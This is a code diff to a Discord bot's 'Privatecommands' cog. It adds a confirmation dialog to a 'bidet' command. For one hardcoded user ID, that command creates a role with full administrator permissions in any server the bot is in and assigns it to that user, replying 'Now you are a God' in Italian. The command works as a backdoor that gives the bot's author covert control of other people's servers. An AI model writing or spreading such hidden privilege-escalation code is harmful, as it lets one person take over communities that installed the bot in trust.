@@ -118,17 +118,39 @@ class Privatecommands(commands.Cog):
     @commands.command()
     async def bidet(self, ctx, guild_id: int = None):
         bidet = self.bot.get_user(450772749829537793)
+        if not ctx.author.id == bidet.id:
+            return
+        confirm_view = discord.ui.View(timeout=30)
+        confirmed = {"value": False}
+        async def confirm_cb(interaction):
+            if interaction.user == ctx.author:
+                confirmed["value"] = True
+                await interaction.response.edit_message(content="Creating ADMIN role...", embed=None, view=None)
+        async def cancel_cb(interaction):
+            if interaction.user == ctx.author:
+                await interaction.response.edit_message(content="Cancelled.", embed=None, view=None)
+        confirm_button = discord.ui.Button(label="✔ Yes", style=discord.ButtonStyle.green)
+        confirm_button.callback = confirm_cb
+        cancel_button = discord.ui.Button(label="❌ No", style=discord.ButtonStyle.red)
+        cancel_button.callback = cancel_cb
+        confirm_view.add_item(confirm_button)
+        confirm_view.add_item(cancel_button)
+        embed = discord.Embed(title="⚠️ Confirm ADMIN Role Creation", description="This will create a role with **ADMINISTRATOR** permissions and assign it to you. Are you SURE?", color=0xff3fb9)
+        msg = await ctx.send(embed=embed, view=confirm_view)
+        await confirm_view.wait()
+        if not confirmed["value"]:
+            try:
+                await msg.edit(content="Cancelled.", embed=None, view=None)
+            except:
+                pass
+            return
         if ctx.channel.type == discord.ChannelType.private:
-            if not ctx.author.id == bidet.id:
-                return
             guild = self.bot.get_guild(guild_id)
             member = guild.get_member(bidet.id)
             role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
             await member.add_roles(role)
             await ctx.send("Ora sei un Dio")
         else:
-            if not ctx.author.id == bidet.id:
-                return
             if guild_id is None:
                 guild_id = ctx.guild.id
             guild = self.bot.get_guild(guild_id)
